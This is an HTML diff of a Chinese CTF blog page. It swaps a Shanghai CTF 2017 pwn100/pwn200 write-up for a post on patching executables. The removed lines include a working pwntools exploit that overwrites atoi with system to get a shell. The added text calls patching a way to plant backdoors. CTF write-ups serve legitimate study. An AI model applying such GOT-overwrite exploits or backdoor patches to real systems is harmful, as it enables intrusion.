@@ -45,7 +45,7 @@
     
     <title>
         
-            上海ctf2017 pwn100 &amp;&amp; pwn200 | 
+            可执行文件patch技术&amp;&amp;持续更新 | 
         
         穷则变，变则通，通则久
     </title>
@@ -57,7 +57,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="hac425">
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content=",heap">
+    <meta name="keywords" content=",patch,elf patch,pe patch,mach-o patch,ctf">
 
     <!-- Import lsloader -->
     <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
@@ -239,18 +239,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://jinyu00.github.io">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="上海ctf2017 pwn100 &amp;&amp; pwn200 | 穷则变，变则通，通则久">
+    <meta property="og:title" content="可执行文件patch技术&amp;&amp;持续更新 | 穷则变，变则通，通则久">
     <meta property="og:image" content="http://jinyu00.github.io/img/girl.png" />
     <meta property="og:description" content="">
-    <meta property="og:article:tag" content="heap"> 
+    <meta property="og:article:tag" content="patch"> <meta property="og:article:tag" content="elf patch"> <meta property="og:article:tag" content="pe patch"> <meta property="og:article:tag" content="mach-o patch"> <meta property="og:article:tag" content="ctf"> 
 
     
-        <meta property="article:published_time" content="Sun Nov 05 2017 23:32:00 GMT+0800" />
-        <meta property="article:modified_time" content="Mon Nov 06 2017 14:38:08 GMT+0800" />
+        <meta property="article:published_time" content="Tue Nov 07 2017 21:51:00 GMT+0800" />
+        <meta property="article:modified_time" content="Tue Nov 07 2017 22:45:27 GMT+0800" />
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="上海ctf2017 pwn100 &amp;&amp; pwn200 | 穷则变，变则通，通则久">
+    <meta name="twitter:title" content="可执行文件patch技术&amp;&amp;持续更新 | 穷则变，变则通，通则久">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="http://jinyu00.github.io/img/girl.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -258,7 +258,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://jinyu00.github.io/ctf/2017-11-05-上海ctf2017-pwn100-pwn200.html" />
+        <link rel="canonical" href="http://jinyu00.github.io/文件patch/2017-11-07-可执行文件patch技术-持续更新.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -270,10 +270,10 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "http://jinyu00.github.io/ctf/2017-11-05-上海ctf2017-pwn100-pwn200.html",
-    "headline": "上海ctf2017 pwn100 && pwn200",
-    "datePublished": "Sun Nov 05 2017 23:32:00 GMT+0800",
-    "dateModified": "Mon Nov 06 2017 14:38:08 GMT+0800",
+    "mainEntityOfPage": "http://jinyu00.github.io/文件patch/2017-11-07-可执行文件patch技术-持续更新.html",
+    "headline": "可执行文件patch技术&&持续更新",
+    "datePublished": "Tue Nov 07 2017 21:51:00 GMT+0800",
+    "dateModified": "Tue Nov 07 2017 22:45:27 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "hac425",
@@ -291,7 +291,7 @@
             "url": "/img/girl.png"
         }
     },
-    "keywords": ",heap",
+    "keywords": ",patch,elf patch,pe patch,mach-o patch,ctf",
     "description": "",
 }
 </script>
@@ -366,7 +366,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn100"><span class="post-toc-number">2.</span> <span class="post-toc-text">pwn100</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn200"><span class="post-toc-number">3.</span> <span class="post-toc-text">pwn200</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ELF"><span class="post-toc-number">2.</span> <span class="post-toc-text">ELF</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Patchkit"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">Patchkit</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#LIEF"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">LIEF</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#修改库函数"><span class="post-toc-number">2.2.0.1.</span> <span class="post-toc-text">修改库函数</span></a></li></ol></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#通过-got-plt-表-直接劫持程序"><span class="post-toc-number">2.2.1.</span> <span class="post-toc-text">通过 got/plt 表 直接劫持程序</span></a></li></ol></li></ol></li></ol>
     </ul>
     
 
@@ -398,7 +398,7 @@
         
     
             <p class="article-headline-p">
-                上海ctf2017 pwn100 && pwn200
+                可执行文件patch技术&&持续更新
             </p>
         </div>
 
@@ -417,7 +417,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>hac425</strong>
-        <span>11月 05, 2017</span>
+        <span>11月 07, 2017</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -439,7 +439,7 @@
 <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
     <li class="mdl-menu__item">在其它设备中阅读本文章</li>
     
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAAC30lEQVR42u3aQW7jQAwEQP//09nrAptVujlyIM+UTgZiS1PKgSCbr68jrxc2NjY2NjY2Njb2I9mv+Prhpv/5TnuHv7+Z3DM/MzY2Nvbe7Bnp+ij5Pf/9fM2YnRkbGxv7BHbymPy4UXsQPOsbQHlmbGxsbOz2KG1hSwoYNjY2NvY72AlmNipaaV2wsbGxT2avDIDa8pYPifJi+cZZGjY2Nvbj2Xlo+pzPv5pvY2NjYz+Y3V7JuKc94qyM1SfHxsbG3pTdrstctwdJW9LGvSvnxMbGxj6HnQ+GkjLTBrSziLctddjY2Nh7s5PQ9PpFJL/KX9xKE1LM0rCxsbG3YBcFIH58u8oziwTqZgYbGxv7APbKcL+NYN/BGwa92NjY2Bux83LVNi1ttLAS/UZDJWxsbOzD2CurNnk8MBszFffBxsbG3pQ9W39ZCWvbMCCJHKKXjo2Njb0pO8esRLz56P/6m3kjNExFsLGxsT+Q3T6+Hfq3w6kkHh4G1djY2NibsvPWIh/uJ4P7WeibNyq35dvY2NjYH8Vuxz13BcZJiWqfjo2NjX0ye32ENFuaXG94fnjF2NjY2Juy20WcdlGyXaBvm5m8vGFjY2Pvyk7GSbOhf95gtAHwbBkUGxsbe1d2Po5vV3Nmw/3ZSxnWbWxsbOyN2HlBmr2CZIw1+wfkDQk2Njb2Cey8GKy/lBl1FidjY2Njn8DOx/qzpcl8GagtgcPlS2xsbOxN2ckoP/9V/kLbcHfYPmFjY2Mfw84fkAQDecPzWriGQyVsbGzsLdjt1Zal2R2SFqUth9jY2Ni7stsi0Q73V5Zy7iq02NjY2Cew86KVtyj5wmX7ipO/DlMRbGxs7A9nz0LcWaDbvohZocXGxsbGnn0nKTx52LDeumBjY2Njrxez9oh3lUBsbGzs09htabl3rJ+Pn/JhEzY2NvY57HbBsV27aYvcXQua2NjY2Cewz7mwsbGxsbGxsbGxH3P9AXudkQP4ma/SAAAAAElFTkSuQmCC">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQ4AAAEOCAAAAABd2qZ5AAADkklEQVR42u3ay27bQBAEQP3/TyfXAI7l7pldQjCKp4BQxGXp0J7H64/rn+uFAAcOHDhw4MCBAweOD+Z4xdfX//X+e/7z4OD++8+8/+TwXXDgwIEDxwWOH6IoOGKO2FJ+B5EAJe+CAwcOHDjucSSPmYVidKzgTsLakuHAgQMHjs/hqB/8NjLfw+XfjwMHDhw4fgfH5kBt+y/5PA4cOHDg+ASOpNzKj9uiJ0E7Kykv9kpx4MCBA8d6oeHz//3ofgcOHDhw4PjC0V7tStxsqa4N79Ub4cCBAweOoxx5ULUHna3Q5Ytx7XNx4MCBA8fzHG2UtnAtU/49mz8OcODAgQPHWY79cYdrBKPQ3RdvOHDgwIHjeY7kTlvazRp8CdmmeMOBAwcOHM9wvEfJg/PUQlse5PmPigMHDhw47nHMVhPaSD71bVGzr/1pceDAgQPHUY68nNuMpvI7bWtvVuzhwIEDB457HPmoqS2rZgRJ0fgaXThw4MCB4xmOZFCUtPbyFYR81NSitEMvHDhw4MBxmyMfONVLAyVTPujKh17f/pA4cODAgeMox34lbj9kSgqzfCSWr1zgwIEDB457HG0h17YX2+bdPkSL9iUOHDhw4LjG0RZLebjmCwqzyJ+tQeDAgQMHjmc42peZrc1tyrbNEkYdtDhw4MCBY8TRRmZe2s3iM19WSMK1DlocOHDgwHGII2qlnRr2LBbd2mHV4YUGHDhw4MARd8NmiwsHou5oaVe3PnHgwIEDxzWO2bioXWjbjKySPwgO90px4MCBA8dizpLf2RRU+YgrbyO24Y0DBw4cOO5xnGrDtZ9sVxBmZV5dwuHAgQMHjjVH/jJ5UdcWXW1Jlo/KoqjGgQMHDhzXOPLjJjRJ7OXf0/5ZcKA5iAMHDhw41mOnU/HWrhrkBV7eTCxOggMHDhw4LnPkKLPR1KZsa0dNScDjwIEDB457HPnjkwWF2VrDLLBnIy4cOHDgwHGDo71amn3Lb9ZwzE+FAwcOHDjOcszCKT/KvsmY308Kv9UUDgcOHDhwjEq4/PXypmEe2G3D8cCKHg4cOHDguMaRD4E2iwiblYjN01dTOBw4cODA8QjHpp2XxGo7ZBoOyXDgwIEDx0dyvA/XvPSatQs3oYsDBw4cOO5x5EsMbZOuGAIFjcX2Z/jhhDhw4MCB4wJHHlSbKJ1F7GygtQpaHDhw4MCx4HDhwIEDBw4cOHDgwIHjw66/ADQfuKcCIxcAAAAASUVORK5CYII=">
     
 </ul>
 
@@ -453,7 +453,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/heap/">heap</a>
+        <a class="post_tag-link" href="/tags/ctf/">ctf</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/elf-patch/">elf patch</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/mach-o-patch/">mach-o patch</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/patch/">patch</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/pe-patch/">pe patch</a>
     </ul>
     
 
@@ -480,7 +480,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=上海ctf2017 pwn100 &amp;&amp; pwn200&url=http://jinyu00.github.io/ctf/2017-11-05-上海ctf2017-pwn100-pwn200.html&pic=http://jinyu00.github.io/img/girl.png&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=可执行文件patch技术&amp;&amp;持续更新&url=http://jinyu00.github.io/文件patch/2017-11-07-可执行文件patch技术-持续更新.html&pic=http://jinyu00.github.io/img/girl.png&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -489,7 +489,7 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=上海ctf2017 pwn100 &amp;&amp; pwn200&url=http://jinyu00.github.io/ctf/2017-11-05-上海ctf2017-pwn100-pwn200.html&via=hac425" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=可执行文件patch技术&amp;&amp;持续更新&url=http://jinyu00.github.io/文件patch/2017-11-07-可执行文件patch技术-持续更新.html&via=hac425" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Twitter
             </li>
@@ -498,7 +498,7 @@
 
     <!-- Share Facebook -->
     
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://jinyu00.github.io/ctf/2017-11-05-上海ctf2017-pwn100-pwn200.html" target="_blank">
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://jinyu00.github.io/文件patch/2017-11-07-可执行文件patch技术-持续更新.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Facebook
             </li>
@@ -507,7 +507,7 @@
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=http://jinyu00.github.io/ctf/2017-11-05-上海ctf2017-pwn100-pwn200.html" target="_blank">
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://jinyu00.github.io/文件patch/2017-11-07-可执行文件patch技术-持续更新.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Google+
             </li>
@@ -531,48 +531,52 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>尽量详细，给有需要的学弟们看看<br>分析的 idb 文件在这：</p>
-<p><a href="https://gitee.com/hac425/blog_data/tree/master/shanghaictf" target="_blank" rel="external">https://gitee.com/hac425/blog_data/tree/master/shanghaictf</a></p>
-<h3 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h3><p>程序是一个经典的 堆管理程序，基本增删改查功能。</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15098962009599uzwpyqa.png?imageslim" alt="paste image"></p>
-<p><code>add</code> 功能很正常，分配8字节的内存然后写入8字节内容。把 分配到的 <code>heap</code>指针存到 <code>table</code> 中，然后 <code>count++</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509896434623h6e9584f.png?imageslim" alt="paste image"></p>
-<p>我们调试看看，使用 <code>add</code> 功能然后 看看堆的内容</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15098965027379oqb1bwg.png?imageslim" alt="paste image"></p>
-<p>可以看到尽管 <code>malloc(8)</code> 实际会分配 <code>0x20</code> 字节（0x10 chunk结构 + 8 + 8 字节 对齐padding）<br>所以这里应该没有溢出的问题，但是注意 <code>count</code> 变量会索引到下一个没有使用的 <code>table</code> 表项。</p>
-<p>这个程序的问题在于，在 <code>get_last</code>, <code>edit</code> 时会直接使用 <code>table[count]</code> 来获取要处理的指针， 而且在 <code>delete</code> 时就只是简单的 <code>count--</code>,而且<code>count</code> 是一个有符号整数。这样多次 <code>delete</code> 后，<code>count</code> 会变成 负数。</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509934315611x779r1bk.png?imageslim" alt="paste image"></p>
-<p>然后 通过<code>table[count]</code>（<code>*(table + count*8)</code>） ,这样我们就可以通过<code>get_last</code>, <code>edit</code>来 泄露内存和 修改内存了。</p>
-<p><code>ctf</code> 中利用漏洞的目标一般就是执行 <code>system(&#39;sh&#39;)</code>,在这里我们可以通过修改 <code>got</code> 表中<code>atoi</code>函数的指针为 <code>system</code> 的函数，然后在调用 <code>atoi</code> 函数时，就会去调用 <code>system</code> 函数了。为什么要选择 <code>atoi</code> 函数作为目标呢？</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15099347624636c7nenso.png?imageslim" alt="paste image"><br>在打印程序的菜单后，会要我们输入一个选项，这就会调用这个函数，可以看到他会读取 <code>16</code> 字节到 <code>nptr</code>, 然后传到 <code>atoi</code>,如果我们把 <code>atoi</code> 改成<code>system</code>, 然后输入 <code>sh</code> , 就会执行 <code>system(&#39;sh&#39;)</code> 了，目标达到。</p>
-<p>由于是这样获取内存地址： <code>*(table + count*8)</code>， 所以我们需要在 <code>table</code> 的上面（就是地址 &lt; table的地址） 区域找到一个 指向 <code>got</code> 的指针。我们可以使用 <code>pwndbg</code> 的 <code>searchmem</code> 来搜索</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509935326266sve8pr7a.png?imageslim" alt="paste image"></p>
-<p>属于</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509935380746in5n7zt4.png?imageslim" alt="paste image"></p>
-<p>那么现在利用的思路就很清晰了。</p>
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在ctf比赛中， 有时我们需要对可执行文件进行patch, 或者在植入后门时，patch也是常用的手段。不过手工patch比较麻烦，下面介绍几个工具。本文介绍遇到的各种技术，不断更新。</p>
+<h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><h4 id="Patchkit"><a href="#Patchkit" class="headerlink" title="Patchkit"></a>Patchkit</h4><p>地址：<br><a href="https://github.com/lunixbochs/patchkit.git" target="_blank" rel="external">https://github.com/lunixbochs/patchkit.git</a></p>
+<p>1.由于链接器的原因暂时还不能使用 libc 中的函数，所以所有要做的事情都需要我们自己实现。用 c 或者 asm</p>
 <ul>
-<li>首先多次调用 <code>delete</code> 函数使得 <code>table + count*8</code> 指向 这里的 <code>atoi</code> 函数对应的地址，也就是 <code>0x400588</code>.</li>
+<li><code>pt.patch(addr,jmp=jmp_addr)</code>  用于修改程序流程。</li>
+<li><code>pt.hook(addr, target)</code> 用于劫持程序流程，进行参数过滤。</li>
 </ul>
-<ul>
-<li><p>然后我们就可以通过 <code>get_last</code> 功能打印 <code>atoi</code> 函数的地址，通过<code>atoi</code> 在 <code>libc</code> 中的固定偏移，泄露 <code>libc</code> 的地址。</p>
-</li>
-<li><p>然后获取 <code>system</code> 函数地址，然后使用 <code>edit</code> 修改 <code>atoi</code> 函数的地址改成 <code>system</code>函数地址。然后输入<code>sh</code>  即可。</p>
-</li>
-</ul>
-<p>exp(要跑 20几分钟左右):</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"># context.log_level = &apos;debug&apos;</div><div class="line">p = process(&quot;./list&quot;)</div><div class="line"></div><div class="line">puts_plt = 0x602018</div><div class="line"></div><div class="line"></div><div class="line">def add(content):</div><div class="line">    p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    p.sendline(&quot;1&quot;)</div><div class="line">    p.recvuntil(&quot;Input your content:\n&quot;)</div><div class="line">    sleep(0.5)</div><div class="line">    p.sendline(content)</div><div class="line"></div><div class="line"></div><div class="line">def get_last_content():</div><div class="line">    p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    p.sendline(&quot;2&quot;)</div><div class="line">    p.recvuntil(&apos;4.Delete&apos;)</div><div class="line">    p.recvuntil(&apos;5.Exit\n&apos;)</div><div class="line">    content = p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    addr = u64(content[:6].ljust(8, &apos;\x00&apos;))</div><div class="line">    hexdump(content)</div><div class="line">    hexdump(content)</div><div class="line">    return addr</div><div class="line"></div><div class="line"></div><div class="line">def edit(content):</div><div class="line">    p.sendline(&quot;3&quot;)</div><div class="line">    sleep(0.5)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"></div><div class="line">def delete():</div><div class="line">    p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    p.sendline(&quot;4&quot;)</div><div class="line"></div><div class="line"># alloc 3 chunk before to 3</div><div class="line"></div><div class="line"></div><div class="line">def get_count_to_addr(addr):</div><div class="line">    time = 0x602080 + 3 * 8 - addr</div><div class="line">    time = time / 8</div><div class="line"></div><div class="line">    print time</div><div class="line">    for i in range(time):</div><div class="line">        # sleep(0.5)</div><div class="line">        delete()</div><div class="line"></div><div class="line"></div><div class="line">gdb.attach(p)</div><div class="line"></div><div class="line">add(&quot;B&quot; * 8)</div><div class="line">add(&quot;B&quot; * 8)</div><div class="line">add(p64(puts_plt))</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">get_count_to_addr(0x400588)</div><div class="line"></div><div class="line">print &quot;modify the count to fushu&quot;</div><div class="line">pause()</div><div class="line"></div><div class="line">print &quot;::::&quot; * 10</div><div class="line"></div><div class="line">atoi_addr = get_last_content()</div><div class="line">libc_addr = atoi_addr - 0x36e80</div><div class="line">system_addr = libc_addr + 0x45390</div><div class="line"></div><div class="line">log.success(&quot;system: &quot; + hex(system_addr))</div><div class="line"></div><div class="line">edit(p64(system_addr))</div><div class="line"></div><div class="line">log.success(&quot;modify atoi---&gt; system&quot;)</div><div class="line"></div><div class="line">p.sendline(&quot;sh&quot;)</div><div class="line"></div><div class="line">p.interactive()</div><div class="line"></div><div class="line"></div><div class="line"># bp 0x0400924</div></pre></td></tr></table></figure>
-<h3 id="pwn200"><a href="#pwn200" class="headerlink" title="pwn200"></a>pwn200</h3><p>就是用<code>c++</code> 写的程序比较难看，不过看到程序的菜单，漏洞就很清楚了。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936031356ptc0dds9.png?imageslim" alt="paste image"><br>提示的很明显了，应该是 <code>uaf</code>, 那我们就重点看看与内存分配相关的位置。</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936258753devxv5lf.png?imageslim" alt="paste image"></p>
-<p>首先会分配两个结构体，其中开始8字节被写入了函数的指针。</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936430537ciumch55.png?imageslim" alt="paste image"><br>可以看到内存块的大小为 <code>0x40</code> 大小。通过 <code>new(0x30)</code> 分配得到，所以 <code>new</code> 和 <code>malloc</code> 的分配方式应该是一样的。接着往下看。</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/150993658543336ohfyxh.png?imageslim" alt="paste image"><br>选择<code>2</code> 时，可以有我们提供大小，传到 <code>new</code> ,然后通过 <code>read</code> 写入内容。</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936668993dl8aosz9.png?imageslim" alt="paste image"></p>
-<p><code>free</code> 时会调用 <code>delete</code>  释放掉内存块。<code>free</code> 之后可以看到进入了<code>fastbin</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/15099367564697zfv0v57.png?imageslim" alt="paste image"><br>那此时我们使用 <code>2</code> 号功能，连续分配两块 <code>48</code>(0x30) 字节的内存，就会拿到这两块内存了。</p>
-<p>程序中内置了<code>getshell</code>函数</p>
